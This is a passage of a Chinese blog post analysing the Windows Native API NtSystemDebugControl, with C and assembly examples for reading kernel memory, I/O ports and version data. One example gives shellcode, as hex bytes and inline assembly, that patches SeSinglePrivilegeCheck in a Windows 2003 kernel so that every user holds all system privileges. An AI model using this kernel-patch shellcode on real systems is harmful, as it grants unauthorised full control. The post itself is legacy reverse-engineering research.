7,<p>//从内核空间拷贝到用户空间，或者从用户空间拷贝到用户空间<br>//但是不能从用户空间拷贝到内核空间<br>SysDbgCopyMemoryChunks_0 = 8,<br>//SysDbgReadVirtualMemory = 8,<p>//从用户空间拷贝到内核空间，或者从用户空间拷贝到用户空间<br>//但是不能从内核空间拷贝到用户空间<br>SysDbgCopyMemoryChunks_1 = 9,<br>//SysDbgWriteVirtualMemory = 9,<p>//从物理地址拷贝到用户空间，不能写到内核空间<br>SysDbgCopyMemoryChunks_2 = 10,<br>//SysDbgReadVirtualMemory = 10,<p>//从用户空间拷贝到物理地址，不能读取内核空间<br>SysDbgCopyMemoryChunks_3 = 11,<br>//SysDbgWriteVirtualMemory = 11,<p>//读写处理器相关控制块<br>SysDbgSysReadControlSpace = 12,<br>SysDbgSysWriteControlSpace = 13,<p>//读写端口<br>SysDbgSysReadIoSpace = 14,<br>SysDbgSysWriteIoSpace = 15,<p>//分别调用RDMSR@4和_WRMSR@12<br>SysDbgSysReadMsr = 16,<br>SysDbgSysWriteMsr = 17,<p>//读写总线数据<br>SysDbgSysReadBusData = 18,<br>SysDbgSysWriteBusData = 19,<p>SysDbgSysCheckLowMemory = 20,<p>// 以下是NT 5.2 新增的<p>//分别调用_KdEnableDebugger@0和_KdDisableDebugger@0<br>SysDbgEnableDebugger = 21,<br>SysDbgDisableDebugger = 22,<p>//获取和设置一些调试相关的变量<br>SysDbgGetAutoEnableOnEvent = 23,<br>SysDbgSetAutoEnableOnEvent = 24,<br>SysDbgGetPitchDebugger = 25,<br>SysDbgSetDbgPrintBufferSize = 26,<br>SysDbgGetIgnoreUmExceptions = 27,<br>SysDbgSetIgnoreUmExceptions = 28<br>} SYSDBG_COMMAND, *PSYSDBG_COMMAND;<p>从上面可以看出，在Windows NT 5.1以上的NtSystemDebugControl可以实现读写<br>内核线性空间数据、读写物理内存、读写端口、读写总线数据、读写MSR 等功能；在<br>Windows NT 5.2以上还可以在系统运行状态下使能、禁用内核调试以及获取、设置一<br>些相关变量等。<p>显然，从Windows XP开始，我们再次获得了MS DOS时代直接操纵系统的权杖，戴<br>着桂冠，重新回到了奥林匹斯山之巅。<p>下面举几个具体应用的例子。<p>例子1：<p>下面代码演示读取KdVersionBlock：<p>//————————————————————————<br>typedef struct _DBGKD_GET_VERSION64 {<br>USHORT MajorVersion;<br>USHORT MinorVersion;<br>USHORT ProtocolVersion;<br>USHORT Flags;<br>USHORT MachineType;<br>UCHAR MaxPacketType;<br>UCHAR MaxStateChange;<br>UCHAR MaxManipulate;<br>UCHAR Simulation;<br>USHORT Unused[1];<br>ULONG64 KernBase;<br>ULONG64 PsLoadedModuleList;<br>ULONG64 DebuggerDataList;<br>} DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64;<p>DBGKD_GET_VERSION64 KdVersionBlock;<p>EnablePrivilege(SE_DEBUG_NAME);<p>ZwSystemDebugControl<br>(<br>SysDbgSysGetVersion,<br>NULL,<br>0,<br>&amp;KdVersionBlock,<br>sizeof(KdVersionBlock), //必须是0×28<br>NULL<br>);<p>printf (”KernBase: 0x%.8x\n”,KdVersionBlock.KernBase);<br>printf (”PsLoadedModuleList: 0x%.8x\n”,KdVersionBlock.PsLoadedModuleList);<br>printf (”DebuggerDataList: 0x%.8x\n”,KdVersionBlock.DebuggerDataList);<br>//————————————————————————<p>例子2：<p>下面代码演示读取内核空间数据的操作，这里读取的是Windows 2003内核映像的<br>头两个字节，也就是“MZ”。<p>//————————————————————————<br>typedef struct _MEMORY_CHUNKS {<br>ULONG Address;<br>PVOID Data;<br>ULONG Length;<br>}MEMORY_CHUNKS, *PMEMORY_CHUNKS;<p>MEMORY_CHUNKS QueryBuff;<br>ULONG ReturnLength;<br>char Buff[0×2] = {0};<p>QueryBuff.Address = 0×804e0000; //Windows 2003的KernBase<br>QueryBuff.Data = Buff; //在此是读出缓冲<br>QueryBuff.Length = sizeof(Buff);<p>EnablePrivilege(SE_DEBUG_NAME);<p>ZwSystemDebugControl<br>(<br>SysDbgCopyMemoryChunks_0,<br>&amp;QueryBuff,<br>sizeof(MEMORY_CHUNKS), //必须是0×0C<br>NULL,<br>0,<br>&amp;ReturnLength<br>);<p>printf (”\”MZ\”: %s\n”,Buff);<br>//————————————————————————<p>例子3：<p>下面是一个使用NtSystemDebugControl的SysDbgCopyMemoryChunks_1功能实现的<br>Patch内核的ShellCode，把0×80580e66由原来的8a450c改为90b001：<p>修改前：<p>nt!SeSinglePrivilegeCheck+0×5c:<br>80580e66 8a450c mov al,[ebp+0xc]<br>80580e69 c9 leave<br>80580e6a c20c00 ret 0xc<p>修改后：<br>nt!SeSinglePrivilegeCheck+0×5c:<br>80580e66 90 nop<br>80580e67 b001 mov al,0×1<br>80580e69 c9 leave<br>80580e6a c20c00 ret 0xc<p>这样，SeSinglePrivilegeCheck总是返回True，也就是说，无论哪个用户，总是<br>拥有全部系统特权。<p>\xeb\x09\x66\xb8\x08\x01\x8b\xd4\x0f\x34\xc3\x68\x90\xb0\x01\xc9<br>\x8b\xc4\x6a\x04\x50\x68\x66\x0e\x58\x80\x54\x5b\x33\xc0\x50\x54<br>\x50\x50\x6a\x0c\x53\x6a\x09\x50\xe8\xd5\xff\xff\xff\x83<p>//————————————————————————<br>#pragma comment(linker, “/entry:main /ALIGN:4096″ )<br>#pragma comment(lib, “kernel32.lib”)<p>#define sysenter __asm __emit 0×0f __asm __emit 0×34<p>void main(void)<br>{<br>__asm<br>{<br>int 3 //debug<br>jmp patch<p>SystemDebugControl:<p>mov ax,0×108<br>mov edx,esp<br>sysenter<br>ret<p>patch:<p>push 0xc901b090<br>mov eax,esp<br>push 0×04<br>push eax<br>push 0×80580e66<br>push esp<br>pop ebx<br>xor eax,eax<br>push eax<br>push esp //ReturnLength<br>push eax //OutputBufferLength<br>push eax //OutputBuffer<br>push 0×0c //InputBufferLength<br>push ebx //InputBuffer<br>push 0×09 //ControlCode<br>push eax //for sysenter ret<br>call SystemDebugControl<br>add esp,0×30 //只是为了修正堆栈<br>}<br>}<br>//————————————————————————<p>上面只是一个概念代码，使用的Patch地址是固定的，对5.2.3790.0 版本的内核<br>有效。由于调用NtSystemDebugControl 要SeDebugPrivilege，所以这段ShellCode需<br>要在LocalSystem 的身份的进程空间运行，或者自己增加SeDebugPrivilege。最简单<br>的办法就是在WinDBG中执行。<p>例子4：<p>下面是一段完整的代码，利用NtSystemDebugControl读写端口的能力，直接操纵<br>PC Speaker发声：<p>//————————————————————————<br>//演示用ZwSystemDebugControl读写端口使PC Speaker发声<br>//tombkeeper 2004.08.03<p>#include<br>#include<p>#pragma comment(lib, “advapi32″)<p>#define NTAPI __stdcall<br>#define FCHK(a) if (!(a)) {printf(#a ” failed\n”); return 0;}<p>typedef int NTSTATUS;<p>typedef enum _SYSDBG_COMMAND<br>{<br>SysDbgSysReadIoSpace = 14,<br>SysDbgSysWriteIoSpace = 15<br>}SYSDBG_COMMAND, *PSYSDBG_COMMAND;<p>typedef NTSTATUS (NTAPI * PZwSystemDebugControl) (<br>SYSDBG_COMMAND ControlCode,<br>PVOID InputBuffer,<br>ULONG InputBufferLength,<br>PVOID OutputBuffer,<br>ULONG OutputBufferLength,<br>PULONG ReturnLength<br>);<p>PZwSystemDebugControl ZwSystemDebugControl = NULL;<p>typedef struct _IO_STRUCT<br>{<br>DWORD IoAddr; // IN: Aligned to NumBYTEs,I/O address<br>DWORD Reserved1; // Never accessed by the kernel<br>PVOID pBuffer; // IN (write) or OUT (read): Ptr to buffer<br>DWORD NumBYTEs; // IN: # BYTEs to read/write. Only use 1, 2, or 4.<br>DWORD Reserved4; // Must be 1<br>DWORD Reserved5; // Must be 0<br>DWORD Reserved6; // Must be 1<br>DWORD Reserved7; // Never accessed by the kernel<br>}<br>IO_STRUCT, *PIO_STRUCT;<p>BOOL EnablePrivilege (PCSTR name)<br>{<br>HANDLE hToken;<br>BOOL rv;<p>TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} };<br>LookupPrivilegeValue (<br>0,<br>name,<br>&amp;priv.Privileges[0].Luid<br>);<p>OpenProcessToken(<br>GetCurrentProcess (),<br>TOKEN_ADJUST_PRIVILEGES,<br>&amp;hToken<br>);<p>AdjustTokenPrivileges (<br>hToken,<br>FALSE,<br>&amp;priv,<br>sizeof priv,<br>0,<br>0<br>);<br>rv = GetLastError () == ERROR_SUCCESS;<p>CloseHandle (hToken);<br>return rv;<br>}<p>BYTE InPortB (int Port)<br>{<br>BYTE Value;<br>IO_STRUCT io;<p>io.IoAddr = Port;<br>io.Reserved1 = 0;<br>io.pBuffer = (PVOID) (PULONG) & Value;<br>io.NumBYTEs = sizeof (BYTE);<br>io.Reserved4 = 1;<br>io.Reserved5 = 0;<br>io.Reserved6 = 1;<br>io.Reserved7 = 0;<p>ZwSystemDebugControl<br>(<br>SysDbgSysReadIoSpace,<br>&amp;io,<br>sizeof (io),<br>NULL,<br>0,<br>NULL<br>);<br>return Value;<br>}<p>void OutPortB (int Port, BYTE Value)<br>{<br>IO_STRUCT io;<p>io.IoAddr = Port;<br>io.Reserved1 = 0;<br>io.pBuffer = (PVOID) (PULONG) & Value;<br>io.NumBYTEs = sizeof (BYTE);<br>io.Reserved4 = 1;<br>io.Reserved5 = 0;<br>io.Reserved6 = 1;<br>io.Reserved7 = 0;<p>ZwSystemDebugControl<br>(<br>SysDbgSysWriteIoSpace,<br>&amp;io,<br>sizeof (io),<br>NULL,<br>0,<br>NULL<br>);<br>};<p>void BeepOn (int Freq)<br>{<br>BYTE b;<p>if ((Freq >= 20) && (Freq &lt;= 20000))<br>{<br>Freq = 1193181 / Freq;<br>b = InPortB (0x61);<br>if ((b & 3) == 0)<br>{<br>OutPortB (0x61, (BYTE) (b | 3));<br>OutPortB (0x43, 0xb6);<br>}<br>OutPortB (0x42, (BYTE) Freq);<br>OutPortB (0x42, (BYTE) (Freq >> 8));<br>}<br>}<p>void BeepOff (void)<br>{<br>BYTE b;<p>b = (InPortB (0×61) & 0xfc);<br>OutPortB (0×61, b);<br>}<p>int main (void)<br>{<br>HMODULE hNtdll;<br>ULONG ReturnLength;<br>OSVERSIONINFO OSVersionInfo;<br>OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);<p>EnablePrivilege (SE_DEBUG_NAME);<p>FCHK ((hNtdll = LoadLibrary (”ntdll.dll”)) != NULL);<br>FCHK ((ZwSystemDebugControl = (PZwSystemDebugControl)<br>GetProcAddress (hNtdll, “ZwSystemDebugControl”)) != NULL);<br>FCHK ((void *) GetVersionEx (&amp;OSVersionInfo) != NULL);<p>if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT &&<br>OSVersionInfo.dwMajorVersion >= 5 &&<br>OSVersionInfo.dwMinorVersion >= 1) //Windows XP以上<br>{<br>BeepOn (1000); //声音频率1000Hz<br>Sleep (1000);<br>BeepOff ();<br>}<br>else<br>{<br>printf (”This program require Windows XP or Windows 2003.\n”);<br>}<br>return 0;<br>}<br>//————————————————————————<p>参考资源：<p>[1]Microsoft Windows NtSystemDebugControl() Kernel API Function Privilege<br>Escalation Vulnerability<br>http://www.securityfocus.com/bid/9694<p>[2]ntexapi.h<br>http://www.codeguru.com/code/legacy/system/ntexapi.zip<br>http://void.ru/files/Ntexapi.h</p><a id=more></a></div><footer class=post-footer><hr><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
对Native API NtSystemDebugControl的分析</li><li class=post-copyright-author><strong>本文作者： </strong>Rise</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/ title="对Native API NtSystemDebugControl的分析">https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/black.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=https://www.zhihu.com/people/rise-worlds><span class=icon><i class="fa fa-book"></i>
</span><span class=label>知乎</span></a></div><div class=social-item><a target=_blank class=social-link href=https://twitter.com/riseworlds><span class=icon><i class="fab fa-twitter"></i>
</span><span class=label>Twitter</span></a></div><div class=social-item><a target=_blank class=social-link href=https://www.facebook.com/rise.worlds><span class=icon><i class="fab fa-facebook"></i>
</span><span class=label>facebook</span></a></div><div class=social-item><a target=_blank class=social-link href=https://youtube.com/@YiXuan><span class=icon><i class="fab fa-youtube"></i>
</span><span class=label>YouTube</span></a></div><div class=social-item><a target=_blank class=social-link href=https://instagram.com/rise.worlds><span class=icon><i class="fab fa-instagram"></i>
</span><span class=label>Instagram</span></a></div><div class=social-item><a target=_blank class=social-link href=https://t.me/riseworlds><span class=icon><i class="fab fa-telegram"></i>
</span><span class=label>Telegram</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/x-files-directory-and-plot-introduction/ rel=next title="X-Files 目录及剧情简介"><i class="fa fa-chevron-left"></i> X-Files 目录及剧情简介</a></div><div class="post-nav-prev post-nav-item"><a href=/post/driver-level-hide-files-registry-processes/ rel=prev title=驱动级隐藏文件,注册表,进程>驱动级隐藏文件,注册表,进程
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
<span>评论交流</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=giscus-container></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2004 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>Rise</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.152.2 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>豫ICP备2021009490号</a>
<img src=/imgs/gongan.png alt=豫公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41162302000074" target=_blank>豫公网安备 41162302000074 号</a></div></div></footer><script class=next-config data-name=page type=application/json>{"comments":true,"expired":false,"isHome":false,"isPage":true,"path":"native-api-ntsystemdebugcontrol-analysis","permalink":"https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/","title":"对Native API NtSystemDebugControl的分析","toc":false,"waline3":{"pagecnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"3.5.7"}}}</script><script type=text/javascript src=https://blogs.qipai360.cn/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://blogs.qipai360.cn/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"Announcements","categoryid":"DIC_kwDOA6L0YM4CiXf9","emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"rise-worlds/rise-worlds.github.io","repoid":"MDEwOlJlcG9zaXRvcnk2MTAxMTA0MA==","theme":"transparent_dark"},"js":"https://giscus.app/client.js"},"hostname":"https://blogs.qipai360.cn/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":false,"lang":"zh-CN","lazyload":false,"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":false,"plugin":"waline3"},"views":{"enable":true,"plugin":"waline3"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":false},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://blogs.qipai360.cn/js/3rd"}},"version":"4.8.3","waline3":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o 可用快捷键选取表情符号：😀😄😁🥳👻👽👀🚄 (Window系统：Win+.，Mac系统：Control+Command+Space)","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"search":true,"serverurl":"https://walinejs.comment.lithub.cc","sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"3.5.7"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"3.5.7"}}}</script><script type=text/javascript src="/js/main.min.js?=1761990624" defer></script></body></html>